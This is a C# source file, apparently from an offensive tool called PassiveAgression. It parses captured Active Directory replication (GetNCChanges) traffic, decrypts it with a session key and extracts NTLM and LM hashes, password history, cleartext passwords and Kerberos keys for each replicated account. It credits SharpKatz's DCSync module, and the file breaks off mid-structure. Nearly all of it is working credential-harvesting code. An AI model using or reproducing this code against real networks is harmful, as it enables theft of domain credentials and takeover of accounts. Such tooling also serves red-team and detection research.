using Newtonsoft.Json.Linq;
using NtApiDotNet;
using PassiveAgression.Core.Network;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using PassiveAgression.Core.Static;
using static PassiveAgression.Core.Win32.Natives;
using System.Security.Principal;
using System.Xml.Linq;
using NtApiDotNet.Utilities.Misc;
using System.Runtime.InteropServices;

namespace PassiveAgression.Core.Events
{
    public class GetNCChangesResponse
    {

        public struct ReplicatedSecrets
        {
            public string DN;
            public string SID;
            public string GUID;

            public string ntlmHash;
            public string lmHash;
            public string ntPwdHistory;
            public string lmPwdHistory;

            public string clearTextPwd;

            public string kerberos_salt;
            public string kerberos_new_salt;
            public string ntlm_strong_ntowf;
            public string aes256;
            public string aes128;
            public string md5;

            public string oldAes256;
            public string oldAes128;
            public string oldMd5;

            public string olderAes256;
            public string olderAes128;
            public string olderMd5;

            public string[] pwdHistory;
        }

        public bool success { get; set; }

        public TCPConnectionInfo connectionInfo { get; set; }

        private string sessionKey;

        private _Unmarshal_Helper.DRS_MSG_GETCHGREPLY_V6? DRS_MSG_GETCHGREPLY;

        public GetNCChangesResponse(TSharkMessage message)
        {
            try
            {
                Parse(message);
                success = true;
            }
            catch
            {
                // Do nothing
            }

        }

        public ReplicatedSecrets[] Secrets { get; set; }

        /// <summary>
        /// Parses data from message into structs. 
        /// </summary>
        /// <param name="message"></param>
        private void Parse(TSharkMessage message)
        {
            //// Set data to be correlated with in later packets
            connectionInfo = message.TCPInfo;

            var raw_dcerpc = message.FindNodeByName<string>("dcerpc.payload_stub_data_raw");

            if (raw_dcerpc == null)
                throw new NullReferenceException("Empty TShark message");

            // Don't decode all replication messages. Check if hexstream contains 
            // ATT_SUPPLEMENTAL_CREDENTIALS ATTId. The stream is Little Endian and 
            // the ATTId is in Big Endian. Convert it, then check
            string attLe         = Misc.GetAttIdInLEHexString(Enums.ATTIds.ATT_SUPPLEMENTAL_CREDENTIALS);
            bool   hasUnicodePwd = raw_dcerpc.ToLower().Contains(attLe.ToLower());

            // Next, check if the stream starts with 06000000. If not or if the stream does not contain ATT_SUPPLEMENTAL_CREDENTIALS
            // we won't process the replication message
            if (!(raw_dcerpc.StartsWith("06000000") && hasUnicodePwd))
            {
                throw new Exception("Data does not contain credentials");
            }

            // Check if response is NDR64 or NDR32 by checking the pointer size
            // of the first pointer
            bool isX64 = raw_dcerpc.StartsWith("0600000000000000");
            bool debug = false;

            byte[] getNCCChangesBytes = Misc.HexStringToBytes(raw_dcerpc);

            _Unmarshal_Helper helper = new _Unmarshal_Helper(getNCCChangesBytes, isX64, debug);
            DRS_MSG_GETCHGREPLY = helper.ReadReferentValue(new Func<_Unmarshal_Helper.DRS_MSG_GETCHGREPLY_V6>(helper.Read_DRS_MSG_GETCHGREPLY_V6), false);
        }

        /// <summary>
        /// Decrypts replication data using supplied session key
        /// </summary>
        /// <param name="sessionKey"></param>
        public void Decrypt(string sessionKey)
        {
            success = false;
            try
            {
                this.sessionKey = sessionKey;
                Secrets    = GetReplicationData();
                success    = true;
            }
            catch
            {
                // skip
            }
        }

        /// <summary>
        /// Thx: https://github.com/b4rtik/SharpKatz/blob/master/SharpKatz/Module/DCSync.cs
        /// </summary>
        /// <returns></returns>
        private ReplicatedSecrets[] GetReplicationData()
        {
            if (DRS_MSG_GETCHGREPLY == null | !DRS_MSG_GETCHGREPLY.HasValue)
                return null;


            // Check if there are values and more than 0 objects available
            if (DRS_MSG_GETCHGREPLY.Value.pObjects == null)
                return null;

            var objects = DRS_MSG_GETCHGREPLY.Value.pObjects.GetValue();

            ReplicatedSecrets[] replSecrets = new ReplicatedSecrets[DRS_MSG_GETCHGREPLY.Value.cNumObjects];

            byte[] sessKey = new byte[16];
            bool hasSessKey = false;
            if (!string.IsNullOrEmpty(sessionKey))
            {
                sessKey = Misc.HexStringToBytes(sessionKey);
                hasSessKey = true;
            }

            bool hasUpdates = true;
            int counter = 0;
            while (hasUpdates)
            {
                ReplicatedSecrets secrets = new ReplicatedSecrets();

                var accountUsed = objects.Entinf.pName.GetValue().StringName;
                var updateValues = objects.Entinf.AttrBlock.pAttr.GetValue();

                // Fetch account data from which the change was initiated
                string strAccountUsed = new string(accountUsed);
                sbyte[] objSidB       = objects.Entinf.pName.GetValue().Sid.Data;
                byte[] uSidBytes      = Misc.ConvertSignedByteArrayToUnsigned(objSidB);
                SecurityIdentifier objSid = new SecurityIdentifier(uSidBytes, 0);
                Guid guid = objects.Entinf.pName.GetValue().Guid;

                secrets.DN = strAccountUsed;
                secrets.GUID = guid.ToString();
                secrets.SID = objSid.Value;

                Dictionary<string, object> DecodedReplicationData = new Dictionary<string, object>();
                byte[] sid;

                foreach (var updatedValue in updateValues)
                {
                    if (updatedValue.AttrVal.pAVal == null)
                    {
                        continue;
                    }

                    // Try to parse the attribute name
                    var attrType = (Enums.ATTIds)updatedValue.attrTyp;
                    var attrVal  = updatedValue.AttrVal.pAVal.GetValue();

                    // we assume non multivalued attributes
                    sbyte[] sData = attrVal[0].pVal.GetValue();

                    // Convert signed to unsigned
                    byte[] data = Misc.ConvertSignedByteArrayToUnsigned(sData);

                    switch (attrType)
                    {
                        case Enums.ATTIds.ATT_LAST_LOGON:
                        case Enums.ATTIds.ATT_PWD_LAST_SET:
                        case Enums.ATTIds.ATT_ACCOUNT_EXPIRES:
                        case Enums.ATTIds.ATT_LOCKOUT_TIME:
                            Int64 intdate = BitConverter.ToInt64(data, 0);
                            DateTime datetime = intdate == Int64.MaxValue ? DateTime.MaxValue : DateTime.FromFileTime(intdate);
                            DecodedReplicationData.Add(attrType.ToString(), datetime);
                            break;
                        case Enums.ATTIds.ATT_RDN:
                        case Enums.ATTIds.ATT_SAM_ACCOUNT_NAME:
                        case Enums.ATTIds.ATT_USER_PRINCIPAL_NAME:
                        case Enums.ATTIds.ATT_SERVICE_PRINCIPAL_NAME:
                            DecodedReplicationData.Add(attrType.ToString(), Encoding.Unicode.GetString(data));
                            break;
                        case Enums.ATTIds.ATT_LOGON_WORKSTATION:
                            break;

                        case Enums.ATTIds.ATT_USER_ACCOUNT_CONTROL:
                            DecodedReplicationData.Add(attrType.ToString(), BitConverter.ToInt32(data, 0));
                            break;
                        case Enums.ATTIds.ATT_SAM_ACCOUNT_TYPE:
                            DecodedReplicationData.Add(attrType.ToString(), BitConverter.ToInt32(data, 0));
                            break;
                        case Enums.ATTIds.ATT_SID_HISTORY:
                        case Enums.ATTIds.ATT_OBJECT_SID:
                            sid = data;
                            DecodedReplicationData.Add(attrType.ToString(), new SecurityIdentifier(data, 0));
                            break;
                        case Enums.ATTIds.ATT_SUPPLEMENTAL_CREDENTIALS:
                            var dec = Crypto.Utils.DecryptReplicationData(data, sessKey);
                            DecodedReplicationData.Add(attrType.ToString(), dec);
                            break;
                        case Enums.ATTIds.ATT_UNICODE_PWD:
                        case Enums.ATTIds.ATT_NT_PWD_HISTORY:
                        case Enums.ATTIds.ATT_DBCS_PWD:
                        case Enums.ATTIds.ATT_LM_PWD_HISTORY:

                            // Decrypt secret data using session key,
                            // then, decrypt resulting data with the sid
                            var decrSessionKey = Crypto.Utils.DecryptReplicationData(data, sessKey);
                            var val            = Crypto.Utils.DecryptHashUsingSID(decrSessionKey, uSidBytes);
                            DecodedReplicationData.Add(attrType.ToString(), val);
                            break;
                        default:
                            DecodedReplicationData.Add(attrType.ToString(), data);
                            break;
                    }
                }

                // Print data to the console
                decodeReplicationData(DecodedReplicationData, ref secrets);

                replSecrets[counter] = secrets;

                // Move to next object
                // Continue until no other objects are available
                hasUpdates = objects.pNextEntInf != null;
                objects = objects.pNextEntInf;

                counter++;
            }

            return replSecrets;

        }

        private static void decodeReplicationData(Dictionary<string, object> dic, ref ReplicatedSecrets _secrets)
        {
            dic.TryGetValue("ATT_RDN", out object rdn);
            dic.TryGetValue("ATT_USER_ACCOUNT_CONTROL", out object uac);
            dic.TryGetValue("ATT_UNICODE_PWD", out object unicodePwd);
            dic.TryGetValue("ATT_NT_PWD_HISTORY", out object ntPwdHistory);
            dic.TryGetValue("ATT_PWD_LAST_SET", out object pwdLastSet);
            dic.TryGetValue("ATT_SUPPLEMENTAL_CREDENTIALS", out object suppCredential);
            dic.TryGetValue("ATT_OBJECT_SID", out object objectSid);
            dic.TryGetValue("ATT_ACCOUNT_EXPIRES", out object accountExp);
            dic.TryGetValue("ATT_DBCS_PWD", out object lmPwd);
            dic.TryGetValue("ATT_LM_PWD_HISTORY", out object lmPwdHistory);
            dic.TryGetValue("ATT_SAM_ACCOUNT_NAME", out object samAccountName);
            dic.TryGetValue("ATT_SAM_ACCOUNT_TYPE", out object samAccountType);
            dic.TryGetValue("ATT_SERVICE_PRINCIPAL_NAME", out object spn);
            dic.TryGetValue("ATT_USER_PRINCIPAL_NAME", out object upn);

            if (unicodePwd != null || ntPwdHistory != null || lmPwd != null || lmPwdHistory != null)
            {
                if (unicodePwd != null)
                    _secrets.ntlmHash = Misc.PrintHashBytes((byte[])unicodePwd);

                if (ntPwdHistory != null)
                    _secrets.ntPwdHistory = Misc.PrintHashBytes((byte[])ntPwdHistory);

                if (lmPwd != null)
                    _secrets.lmHash = Misc.PrintHashBytes((byte[])lmPwd);

                if (lmPwdHistory != null)
                    _secrets.lmPwdHistory = Misc.PrintHashBytes((byte[])lmPwdHistory);
            }

            DcsyncDescrUserProperties((byte[])suppCredential, ref _secrets);
        }

        private static void DcsyncDescrUserProperties(byte[] suppCredential, ref ReplicatedSecrets _secrets)
        {
            int offsetConunt   = Misc.FieldOffset<USER_PROPERTIES>("PropertyCount");
            int offsetLenght   = Misc.FieldOffset<USER_PROPERTIES>("Length");
            int offsetUserProp = Misc.FieldOffset<USER_PROPERTIES>("UserProperties");

            int offsetNameLength  = Misc.FieldOffset<USER_PROPERTY>("NameLength");
            int offsetValueLength = Misc.FieldOffset<USER_PROPERTY>("ValueLength");
            int offsetName        = Misc.FieldOffset<USER_PROPERTY>("PropertyName");

            int numberOfHashesOffset = Misc.FieldOffset<WDIGEST_CREDENTIALS>("NumberOfHashes");
            int hashesOffset         = Misc.FieldOffset<WDIGEST_CREDENTIALS>("Hash");

            if (suppCredential != null)
            {
                int propertyConut = BitConverter.ToInt16((byte[])suppCredential, offsetConunt);

                int readedSize = 0;
                for (int i = 0; i < propertyConut; i++)
                {
                    int nameLength  = BitConverter.ToInt16((byte[])suppCredential, readedSize + offsetUserProp + offsetNameLength);
                    int valueLength = BitConverter.ToInt16((byte[])suppCredential, readedSize + offsetUserProp + offsetValueLength);

                    int valueOffset = offsetName + nameLength;

                    string propertyName     = Encoding.Unicode.GetString((byte[])suppCredential, readedSize + offsetUserProp + offsetName, nameLength);
                    string propertyRawValue = Encoding.Default.GetString((byte[])suppCredential, readedSize + offsetUserProp + offsetName + nameLength, valueLength);

                    byte[] propertyValueBytes = Misc.HexStringToBytes(propertyRawValue);

                    switch (propertyName)
                    {
                        case Static.Win32.Packages:
                        case Static.Win32.PrimaryCleartext:
                            {
                                _secrets.clearTextPwd = Encoding.Unicode.GetString(propertyValueBytes);
                            }
                            break;
                        case Static.Win32.PrimaryKerberos:
                            {
                                //KERB_STORED_CREDENTIAL cred = MiscUtils.ReadStruct<KERB_STORED_CREDENTIAL>(propertyValueBytes);

                                //string dsalt = Encoding.Unicode.GetString(propertyValueBytes, (int)cred.DefaultSaltOffset, cred.DefaultSaltLength);
                                ////Console.WriteLine("[*] \tDefault Salt : {0}", dsalt);
                                //_secrets.kerberos_salt = dsalt;

                                ////Console.WriteLine("[*] \t{0}", "Credentials");
                                //var keys = KeyDataInfo(propertyValueBytes, Marshal.SizeOf(typeof(KERB_STORED_CREDENTIAL)), cred.CredentialCount);
                                //foreach (var key in keys.Keys)
                                //{
                                //    if (key == MiscUtils.KERB_ETYPE_AES256_CTS_HMAC_SHA1_96)
                                //        _secrets.aes256 = keys[key];

                                //    if (key == KERB_ETYPE_AES128_CTS_HMAC_SHA1_96)
                                //        _secrets.aes128 = keys[key];

                                //    if (key == KERB_ETYPE_DES_CBC_MD5)
                                //        _secrets.md5 = keys[key];
                                //}

                                //int new_start = (cred.CredentialCount * Marshal.SizeOf(typeof(KERB_KEY_DATA))) + Marshal.SizeOf(typeof(KERB_STORED_CREDENTIAL));
                                ////Console.WriteLine("[*] \t{0}", "OldCredentials");
                                //keys = KeyDataInfo(propertyValueBytes, new_start, cred.OldCredentialCount);
                            }
                            break;
                        case Static.Win32.PrimaryKerberosNew:
                            {
                                KERB_STORED_CREDENTIAL_NEW cred = Misc.ReadStruct<KERB_STORED_CREDENTIAL_NEW>(propertyValueBytes);

                                string dsalt = Encoding.Unicode.GetString(propertyValueBytes, (int)cred.DefaultSaltOffset, cred.DefaultSaltLength);
                                _secrets.kerberos_new_salt = dsalt;

                                var keys = Crypto.Utils.KeyDataNewInfo(propertyValueBytes, Marshal.SizeOf(typeof(KERB_STORED_CREDENTIAL_NEW)), cred.CredentialCount);
                                foreach (var key in keys.Keys)
                                {
                                    if (key == Static.Win32.KERB_ETYPE_AES256_CTS_HMAC_SHA1_96)
                                        _secrets.aes256 = keys[key];

                                    if (key == Static.Win32.KERB_ETYPE_AES128_CTS_HMAC_SHA1_96)
                                        _secrets.aes128 = keys[key];

                                    if (key == Static.Win32.KERB_ETYPE_DES_CBC_MD5)
                                        _secrets.md5 = keys[key];
                                }

                                int new_start = (cred.CredentialCount * Marshal.SizeOf(typeof(KERB_KEY_DATA_NEW))) + Marshal.SizeOf(typeof(KERB_STORED_CREDENTIAL_NEW));

                                new_start = (cred.ServiceCredentialCount * Marshal.SizeOf(typeof(KERB_KEY_DATA_NEW))) + new_start;
                                keys = Crypto.Utils.KeyDataNewInfo(propertyValueBytes, new_start, cred.OldCredentialCount);
                                foreach (var key in keys.Keys)
                                {
                                    if (key == Static.Win32.KERB_ETYPE_AES256_CTS_HMAC_SHA1_96)
                                        _secrets.oldAes256 = keys[key];

                                    if (key == Static.Win32.KERB_ETYPE_AES128_CTS_HMAC_SHA1_96)
                                        _secrets.oldAes128 = keys[key];

                                    if (key == Static.Win32.KERB_ETYPE_DES_CBC_MD5)
                                        _secrets.oldMd5 = keys[key];
                                }


                                new_start = (cred.OldCredentialCount * Marshal.SizeOf(typeof(KERB_KEY_DATA_NEW))) + new_start;
                                keys = Crypto.Utils.KeyDataNewInfo(propertyValueBytes, new_start, cred.OlderCredentialCount);
                                foreach (var key in keys.Keys)
                                {
                                    if (key == Static.Win32.KERB_ETYPE_AES256_CTS_HMAC_SHA1_96)
                                        _secrets.olderAes256 = keys[key];

                                    if (key == Static.Win32.KERB_ETYPE_AES128_CTS_HMAC_SHA1_96)
                                        _secrets.olderAes128 = keys[key];

                                    if (key == Static.Win32.KERB_ETYPE_DES_CBC_MD5)
                                        _secrets.olderMd5 = keys[key];
                                }

                            }
                            break;
                        case Static.Win32.PrimaryNtlmStrongNTOWF:
                            {
                                _secrets.ntlm_strong_ntowf = Misc.PrintHashBytes(propertyValueBytes);

                            }
                            break;
                        case Static.Win32.PrimaryWDigest:
                            {
                                int numberOfHashes = BitConverter.ToInt16(propertyValueBytes, numberOfHashesOffset);
                                _secrets.pwdHistory = new string[numberOfHashes];
                                byte[] tmp_b = new byte[Static.Win32.MD5_DIGEST_LENGTH];
                                for (int j = 0; j < numberOfHashes; j++)
                                {
                                    Array.Copy(propertyValueBytes, hashesOffset + (j * Static.Win32.MD5_DIGEST_LENGTH), tmp_b, 0, tmp_b.Length);
                                    _secrets.pwdHistory[j] = Misc.PrintHashBytes(tmp_b);

                                }
                            }
                            break;
                        default:
                            {

                            }
                            break;
                    }


                    readedSize += offsetName + nameLength + valueLength;
                }
            }

        }

    }

    class _Unmarshal_Helper : NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer
    {
        /// <summary>
        /// Flag that helps with debugging.
        /// This will dump the skipped bytes to the console
        /// </summary>
        public bool Debug;

        /// <summary>
        /// Flag to align bytes for 64bit pointers
        /// </summary>
        public bool is64bit;

        /// <summary>
        /// Returns the name of the method
        /// </summary>
        /// <returns></returns>
        static string GetMethodName()
        {
            StackTrace   stackTrace  = new StackTrace();
            StackFrame[] stackFrames = stackTrace.GetFrames();

            // Check if there are at least two frames (one for this method, one for the caller)
            if (stackFrames != null && stackFrames.Length >= 2)
            {
                StackFrame callerFrame = stackFrames[2]; // Get the frame of the caller
                return callerFrame.GetMethod().Name;
                //return callerFrame.GetFileLineNumber(); // Get the line number of the caller
            }

            // Unable to determine the line number
            return "Unknown";
        }

        /// <summary>
        /// Hack to reset conformance values, but only if the value in it is 0
        /// </summary>
        public void ClearConformanceValuesWhen0()
        {
            int[] _conformance_values = GetConformanceValuesArray();
            if (_conformance_values.Length != 1) return;
            if (_conformance_values[0] == 0)
                ClearConformanceValues();
        }


        /// <summary>
        /// Reads given number of bytes of the reader
        /// This allows us to align the stream for x64 pointers
        /// </summary>
        /// <param name="bytes"></param>
        public byte[] Align(int bytes, object src, bool ignoreData = false)
        {
            int displayNumOfBytes = 8;

            if (bytes > 8)
                displayNumOfBytes = 16;

            if (is64bit)
            {
                // Peek on the buffer to check if alignment is needed
                byte[] peekData = PeekBuffer(bytes);

                // We want to align pointers. If the byte array contains values other than 0,
                // prepend the line with !: to make it easier to spot this line in the console
                bool hasData = peekData.Any(x => x != 0);

                if (Debug)
                {
                    // Knowing which line of code called this align function makes it easier debugging as well
                    string method = GetMethodName();
                    string marker = ignoreData ? "[*]" : "[NA]";
                    Console.Write($"{marker} ");
                    Console.Write($"{src.ToString()} => {method}:\r\n");
                    Misc.DisplayHexDump(peekData, displayNumOfBytes);
                }

                if (hasData)
                {
                    // Contains data. Check if we should ignore data and align anyway
                    if (!ignoreData)
                        return null;
                }

                // Coast clear to align the data

                byte[] skipped = ReadFixedByteArray(bytes);
                return skipped;
            }

            return null;
        }

        public DRS_MSG_GETCHGREPLY_V6 Read_DRS_MSG_GETCHGREPLY_V6()
        {
            // Fix x64 alignment
            Align(8, this, true);

            return ReadStruct<DRS_MSG_GETCHGREPLY_V6>();
        }

        public _USN_VECTOR Read_USNVEC()
        {
            return ReadStruct<_USN_VECTOR>();
        }

        public _SCHEMA_PREFIX_TABLE Read_PrefixTableSrc()
        {
            return ReadStruct<_SCHEMA_PREFIX_TABLE>();
        }

        public _OID_t Read_OID_t()
        {
            return ReadStruct<_OID_t>();
        }

        public _DSNAME Read_DSNAME()
        {
            return ReadStruct<_DSNAME>();
        }

        public _NT4SID Read_NT4SID()
        {
            return ReadStruct<_NT4SID>();
        }

        public _UPTODATE_VECTOR_V2_EXT Read_UPTODATE_VECTOR_V2_EXT()
        {
            return ReadStruct<_UPTODATE_VECTOR_V2_EXT>();
        }

        public REPLENTINFLIST Read_REPLENTINFLIST()
        {
            return ReadStruct<REPLENTINFLIST>();
        }

        public _ENTINF Read_ENTINF()
        {
            return ReadStruct<_ENTINF>();
        }
       
        public _ATTRBLOCK Read_ATTRBLOCK()
        {
            return ReadStruct<_ATTRBLOCK>();
        }
        
        public _ATTRVALBLOCK Read_ATTRVALBLOCK()
        {
            return ReadStruct<_ATTRVALBLOCK>();
        }

        public _ATTRVAL Read_ATTRVAL()
        {
            return ReadStruct<_ATTRVAL>();
        }

        public _PROPERTY_META_DATA_EXT_VECTOR Read_PROPERTY_META_DATA_EXT_VECTOR()
        {
            return ReadStruct<_PROPERTY_META_DATA_EXT_VECTOR>();
        }

        public _PROPERTY_META_DATA_EXT Read_PROPERTY_META_DATA_EXT()
        {
            return ReadStruct<_PROPERTY_META_DATA_EXT>();
        }

        public _VALUE_META_DATA_EXT_V1 Read_VALUE_META_DATA_EXT_V1()
        {
            return ReadStruct<_VALUE_META_DATA_EXT_V1>();
        }

        public REPLVALINF_V1[] Read_REPLVALINF_V1()
        {
            return ReadConformantStructArray<REPLVALINF_V1>();
        }

        public _PrefixTableEntry[] Read_PrefixTableEntry()
        {
            return ReadConformantStructArray<_PrefixTableEntry>();
        }

        public sbyte[] Read_ATTRVALPVAL()
        {
            // Read the first bytes from the stack
            // The first non-0 byte will be the length of the char array which would normally be used
            // to calculate the char array in the bytestream
            byte[] initBytes = new byte[4];
            bool   gotByte   = false;
            while (!gotByte)
            {
                //initBytes = u.Align(4, this);
                initBytes = ReadFixedByteArray(4);
                if (initBytes.Any(x => x != 0))
                    gotByte = true;
            }

            // we need to align again
            Align(4, this);

            int     arrSize = BitConverter.ToInt32(initBytes);
            sbyte[] result  = new sbyte[arrSize];

            // Read number of bytes from the stream
            result = ReadFixedPrimitiveArray<sbyte>(arrSize);

            // Make sure to reset conformance values
            ClearConformanceValues();

            //return ReadConformantArray<sbyte>();
            return result;
        }
        
        public _PROPERTY_META_DATA_EXT[] Read_FG_Metadata()
        {
            // Fix x64 alignment
            Align(4, this);


            ClearConformanceValuesWhen0();
            _PROPERTY_META_DATA_EXT[] res = ReadConformantStructArray<_PROPERTY_META_DATA_EXT>();

            return res;
        }
        
        public byte[] Read_DRS_EXTENSIONS_RGB()
        {
            return ReadConformantArray<byte>();
        }

        public char[] Read_CharArray()
        {
            return ReadConformantArray<char>();
        }

        public byte[] Read_ByteArray()
        {
            // When using 64 bits pointers, we cannot use the builtin 'ReadConformantArray' function of the NtApiDotNet library
            // since this assumes x86 pointers, which result in invalid byte[] sizes being calculated.
            // We could opt to modify the library, or calculate the size ourselves and read the bytes from the stack
            // For now, last option seems easiest.

            if (!is64bit)
                return ReadConformantArray<byte>();

            // Already aligned, read the size
            int bArrSize = ReadInt32();

            // Align
            Align(4, this);

            byte[] res = ReadFixedByteArray(bArrSize);

            //if (byteArrayCouter >= 40)
            //{

            //}

            // Make sure to properly align the stack
            if (bArrSize % 8 > 0)
            {
                int remainder = bArrSize % 8;
                remainder = 8 - remainder;
                Align(remainder, this);
            }

            //byteArrayCouter++;


            return res;
        }

        public _UPTODATE_CURSOR_V2[] Read_UPTODATE_CURSOR_V2()
        {
            return ReadConformantArray<_UPTODATE_CURSOR_V2>();
        }

        public _ATTR[] Read_ATTRArray()
        {
            return ReadConformantStructArray<_ATTR>();
        }
        
        public _ATTRVAL[] Read_ATTRValArray()
        {
            Align(4, this);

            return ReadConformantStructArray<_ATTRVAL>();
        }

        public sbyte[] Read_NT4SID_Data()
        {
            return ReadFixedPrimitiveArray<sbyte>(28);
        }

        /// <summary>
        /// Constructor
        /// </summary>
        /// <param name="ba"></param>
        /// <param name="is64bit"></param>
        /// <param name="debug"></param>
        public _Unmarshal_Helper(byte[] ba, bool is64bit = false, bool debug = false) :
            base(ba)
        {
            this.is64bit = is64bit;
            this.Debug   = debug;

            if (Debug)
            {
                Console.WriteLine("[============================================================================]");
                Console.WriteLine("[                                    DEBUG                                   ]");
                Console.WriteLine("[============================================================================]");
            }
        }

        #region structures

        public struct DRS_MSG_GETCHGREPLY_V6 : NtApiDotNet.Ndr.Marshal.INdrStructure
        {
            void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)
            {
                Unmarshal(((_Unmarshal_Helper)(u)));
            }

            void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)
            {

            }

            private void Unmarshal(_Unmarshal_Helper u)
            {
                //byte[] i =u.ReadFixedByteArray(8);

                uuidDsaObjSrc = u.ReadGuid();
                uuidInvocIdSrc = u.ReadGuid();

                //u.DSNameAlignmetOffset = 8;
                pNC = u.ReadEmbeddedPointer<_DSNAME>(new System.Func<_DSNAME>(u.Read_DSNAME), false);

                u.Align(4, this);

                usnvecFrom = u.Read_USNVEC();
                usnvecTo = u.Read_USNVEC();
                pUpToDateVecSrc = u.ReadEmbeddedPointer<_UPTODATE_VECTOR_V2_EXT>(new System.Func<_UPTODATE_VECTOR_V2_EXT>(u.Read_UPTODATE_VECTOR_V2_EXT), false);

                // Fix x64 alignment
                u.Align(4, this);

                //u.Align(256, this);

                PrefixTableSrc = u.Read_PrefixTableSrc();

                // Fix x64 alignment
                u.Align(4, this);

                ulExtendedRet = u.ReadInt32();
                cNumObjects = u.ReadInt32();
                cNumBytes = u.ReadInt32();

                // Fix x64 alignment
                u.Align(4, this);

                pObjects = u.ReadEmbeddedPointer<REPLENTINFLIST>(new System.Func<REPLENTINFLIST>(u.Read_REPLENTINFLIST), false);

                // Fix x64 alignment
                u.Align(4, this);

                fMoreData = u.ReadInt32();
                cNumNcSizeObjects = u.ReadInt32();
                cNumNcSizeValues = u.ReadInt32();
                cNumValues = u.ReadInt32();
                rgValues = u.ReadEmbeddedPointer<REPLVALINF_V1[]>(new System.Func<REPLVALINF_V1[]>(u.Read_REPLVALINF_V1), false);
                dwDRSError = u.ReadInt32();
            }
            int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()
            {
                return 8;
            }
            public System.Guid uuidDsaObjSrc;
            public System.Guid uuidInvocIdSrc;
            public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<_DSNAME> pNC;
            public _USN_VECTOR usnvecFrom;
            public _USN_VECTOR usnvecTo;
            public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<_UPTODATE_VECTOR_V2_EXT> pUpToDateVecSrc;
            public _SCHEMA_PREFIX_TABLE PrefixTableSrc;
            public int ulExtendedRet;
            public int cNumObjects;
            public int cNumBytes;
            public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<REPLENTINFLIST> pObjects;
            public int fMoreData;
            public int cNumNcSizeObjects;
            public int cNumNcSizeValues;
            public int cNumValues;
            public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<REPLVALINF_V1[]> rgValues;
            public int dwDRSError;
            public static DRS_MSG_GETCHGREPLY_V6 CreateDefault()
            {
                return new DRS_MSG_GETCHGREPLY_V6();
            }
            public DRS_MSG_GETCHGREPLY_V6(
                        System.Guid uuidDsaObjSrc,
                        System.Guid uuidInvocIdSrc,
                        System.Nullable<_DSNAME> pNC,
                        _USN_VECTOR usnvecFrom,
                        _USN_VECTOR usnvecTo,
                        System.Nullable<_UPTODATE_VECTOR_V2_EXT> pUpToDateVecSrc,
                        _SCHEMA_PREFIX_TABLE PrefixTableSrc,
                        int ulExtendedRet,
                        int cNumObjects,
                        int cNumBytes,
                        System.Nullable<REPLENTINFLIST> pObjects,
                        int fMoreData,
                        int cNumNcSizeObjects,
                        int cNumNcSizeValues,
                        int cNumValues,
                        REPLVALINF_V1[] rgValues,
                        int dwDRSError)
            {
                this.uuidDsaObjSrc = uuidDsaObjSrc;
                this.uuidInvocIdSrc = uuidInvocIdSrc;
                this.pNC = pNC;
                this.usnvecFrom = usnvecFrom;
                this.usnvecTo = usnvecTo;
                this.pUpToDateVecSrc = pUpToDateVecSrc;
                this.PrefixTableSrc = PrefixTableSrc;
                this.ulExtendedRet = ulExtendedRet;
                this.cNumObjects = cNumObjects;
                this.cNumBytes = cNumBytes;
                this.pObjects = pObjects;
                this.fMoreData = fMoreData;
                this.cNumNcSizeObjects = cNumNcSizeObjects;
                this.cNumNcSizeValues = cNumNcSizeValues;
                this.cNumValues = cNumValues;
                this.rgValues = rgValues;
                this.dwDRSError = dwDRSError;
            }
        }
        
        public struct _USN_VECTOR : NtApiDotNet.Ndr.Marshal.INdrStructure
        {
            void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)
            {

            }

            void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)
            {
                Unmarshal(((_Unmarshal_Helper)(u)));
            }
            private void Unmarshal(_Unmarshal_Helper u)
            {
                usnHighObjUpdate = u.ReadInt64();
                usnReserved = u.ReadInt64();
                usnHighPropUpdate = u.ReadInt64();
            }
            int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()
            {
                return 8;
            }
            public long usnHighObjUpdate;
            public long usnReserved;
            public long usnHighPropUpdate;
            public static _USN_VECTOR CreateDefault()
            {
                return new _USN_VECTOR();
            }
            public _USN_VECTOR(long usnHighObjUpdate, long usnReserved, long usnHighPropUpdate)
            {
                this.usnHighObjUpdate = usnHighObjUpdate;
                this.usnReserved = usnReserved;
                this.usnHighPropUpdate = usnHighPropUpdate;
            }
        }
        
        public struct _SCHEMA_PREFIX_TABLE : NtApiDotNet.Ndr.Marshal.INdrStructure
        {
            void NtApiDotNet.Ndr.Marshal.INdrStructure.Marshal(NtApiDotNet.Ndr.Marshal.NdrMarshalBuffer m)
            {

            }

            void NtApiDotNet.Ndr.Marshal.INdrStructure.Unmarshal(NtApiDotNet.Ndr.Marshal.NdrUnmarshalBuffer u)
            {
                Unmarshal(((_Unmarshal_Helper)(u)));
            }
            private void Unmarshal(_Unmarshal_Helper u)
            {

                PrefixCount = u.ReadInt32();
                //u.prefixTableEntryCount = PrefixCount;

                // Fix x64 alignment
                u.Align(4, this);

                pPrefixEntry = u.ReadEmbeddedPointer<_PrefixTableEntry[]>(new System.Func<_PrefixTableEntry[]>(u.Read_PrefixTableEntry), false);
            }
            int NtApiDotNet.Ndr.Marshal.INdrStructure.GetAlignment()
            {
                return 4;
            }
            public int PrefixCount;
            public NtApiDotNet.Ndr.Marshal.NdrEmbeddedPointer<_PrefixTableEntry[]> pPrefixEntry;
            public static _SCHEMA_PREFIX_TABLE CreateDefault()
            {
                return new _SCHEMA_PREFIX_TABLE();
            }
            public _SCHEMA_PREFIX_TABLE(int PrefixCount, _PrefixTableEntry[] pPrefixEntry)
            {
                this.PrefixCount = PrefixCount;
                this.pPrefixEntry = pPrefixEntry;
            }
        }
        
        public struct _PrefixTableEntry : NtApiDotNet.Ndr.Marshal.INdrStructure
        {
